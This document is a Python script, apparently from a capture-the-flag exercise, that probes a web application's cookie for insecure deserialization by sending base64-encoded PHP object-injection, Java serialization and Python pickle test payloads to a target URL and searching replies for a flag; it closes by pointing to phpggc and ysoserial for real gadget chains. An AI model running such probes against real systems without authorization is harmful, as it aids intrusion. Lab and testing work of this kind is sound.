# analyze_cookies.py
import base64
import requests
import re

# Target URL - update this to your target
target_url = "http://127.0.0.1"

# Decode existing cookies to understand format
def analyze_serialization():
    print("=== ANALYZING COOKIE SERIALIZATION FORMAT ===")
    
    bookmarks_cookie = "W10K"
    try:
        decoded = base64.b64decode(bookmarks_cookie).decode('utf-8', errors='ignore')
        print(f"[*] bookmarks cookie raw: {bookmarks_cookie}")
        print(f"[*] bookmarks decoded: {decoded}")
        print(f"[*] Is PHP serialized?: {decoded.startswith('a:') or decoded.startswith('O:') or decoded == '[]'}")
    except Exception as e:
        print(f"[!] Error decoding bookmarks: {e}")
    
    user_cookie = "5fb5fa20dbac4c5cacd23ae94e1b2709"
    print(f"\n[*] user cookie: {user_cookie}")
    print(f"[*] Length: {len(user_cookie)} (looks like MD5 hash)")
    
    # Try to detect format based on patterns
    print("\n=== SERIALIZATION FORMAT DETECTION ===")
    formats = {
        'PHP Serialized': ['a:', 'O:', 's:'],
        'JSON': ['{', '['],
        'XML': ['<?xml', '<'],
    }
    
    for fmt, indicators in formats.items():
        for indicator in indicators:
            if decoded.startswith(indicator):
                print(f"[!] Likely {fmt} based on: {indicator}")
                break
    
    # Check for Java serialized (starts with rO0AB in base64)
    if bookmarks_cookie.startswith('rO'):
        print("[!] Likely Java serialization")
    
    # Check for .NET ViewState (starts with /w)
    if bookmarks_cookie.startswith('/w'):
        print("[!] Likely .NET ViewState")

# Test function - generate various deserialization payloads
def test_deserialization():
    print("\n\n=== TESTING DESERIALIZATION PAYLOADS ===")
    
    # Create test payloads for different formats
    results = []
    
    # 1. PHP Serialized Object Injection
    print("\n[+] Testing PHP Object Injection...")
    
    # Simple PHP serialized payload that might trigger errors
    php_payloads = [
        # Try to trigger __wakeup or __destruct
        'Tzo2OiJPYmplY3QiOjA6e30=',  # O:6:"Object":0:{}
        # Try to trigger errors via malformed data
        'TzoxMDoiU3RkQ2xhc3MiOjA6e30=',  # O:10:"StdClass":0:{}
        # Try empty array (already working)
        'YTowOnt9',  # a:0:{}
    ]
    
    for i, payload in enumerate(php_payloads):
        cookies = {
            'bookmarks': payload,
            'user': '5fb5fa20dbac4c5cacd23ae94e1b2709'
        }
        
        try:
            response = requests.get(target_url, cookies=cookies, timeout=10)
            print(f"\n--- PHP Payload {i+1} ---")
            print(f"[*] Payload: {payload}")
            print(f"[*] Decoded: {base64.b64decode(payload).decode('utf-8', errors='ignore')}")
            print(f"[*] Status: {response.status_code}")
            print(f"[*] Length: {len(response.text)}B")
            
            # Look for errors that might reveal gadget chains
            if 'unserialize' in response.text.lower() or 'wakeup' in response.text.lower():
                print(f"[!] ERROR MESSAGE: {response.text[:500]}")
            
            # Search for flag
            flag_match = re.search(r'FLAG{[^}]+}', response.text)
            if flag_match:
                print(f"[!!!!!!!!] FLAG FOUND: {flag_match.group()}")
                results.append({
                    'payload': payload,
                    'flag': flag_match.group(),
                    'type': 'php'
                })
                
        except Exception as e:
            print(f"[!] Error with PHP payload {i+1}: {e}")
    
    # 2. Java Deserialization
    print("\n[+] Testing Java Deserialization...")
    java_payloads = [
        'rO0ABXNy',  # Java serialized header
        'rO0ABXNyABV4ZWFkZXJleGFtcGxlLg==',
    ]
    
    for i, payload in enumerate(java_payloads):
        cookies = {
            'bookmarks': payload,
            'user': '5fb5fa20dbac4c5cacd23ae94e1b2709'
        }
        
        try:
            response = requests.get(target_url, cookies=cookies, timeout=10)
            print(f"\n--- Java Payload {i+1} ---")
            print(f"[*] Payload: {payload}")
            print(f"[*] Status: {response.status_code}")
            print(f"[*] Length: {len(response.text)}B")
            
            flag_match = re.search(r'FLAG{[^}]+}', response.text)
            if flag_match:
                print(f"[!!!!!!!!] FLAG FOUND: {flag_match.group()}")
                results.append({
                    'payload': payload,
                    'flag': flag_match.group(),
                    'type': 'java'
                })
                
        except Exception as e:
            print(f"[!] Error with Java payload {i+1}: {e}")
    
    # 3. Python Pickle
    print("\n[+] Testing Python Pickle...")
    pickle_payloads = [
        'gASVLg==',
        'gASVBwAAAAAAAAB9Lg==',
    ]
    
    for i, payload in enumerate(pickle_payloads):
        cookies = {
            'bookmarks': payload,
            'user': '5fb5fa20dbac4c5cacd23ae94e1b2709'
        }
        
        try:
            response = requests.get(target_url, cookies=cookies, timeout=10)
            print(f"\n--- Pickle Payload {i+1} ---")
            print(f"[*] Payload: {payload}")
            print(f"[*] Status: {response.status_code}")
            print(f"[*] Length: {len(response.text)}B")
            
            flag_match = re.search(r'FLAG{[^}]+}', response.text)
            if flag_match:
                print(f"[!!!!!!!!] FLAG FOUND: {flag_match.group()}")
                results.append({
                    'payload': payload,
                    'flag': flag_match.group(),
                    'type': 'pickle'
                })
                
        except Exception as e:
            print(f"[!] Error with Pickle payload {i+1}: {e}")
    
    return results

# Main execution
if __name__ == "__main__":
    analyze_serialization()
    flags_found = test_deserialization()
    
    print("\n\n=== SUMMARY ===")
    if flags_found:
        for result in flags_found:
            print(f"[!] FLAG FOUND via {result['type']} deserialization!")
            print(f"[!] Flag: {result['flag']}")
            print(f"[!] Payload: {result['payload']}")
    else:
        print("[*] No flags found yet. Need to create more sophisticated payloads.")
        print("[*] Recommend using phpggc or ysoserial for real gadget chains.")
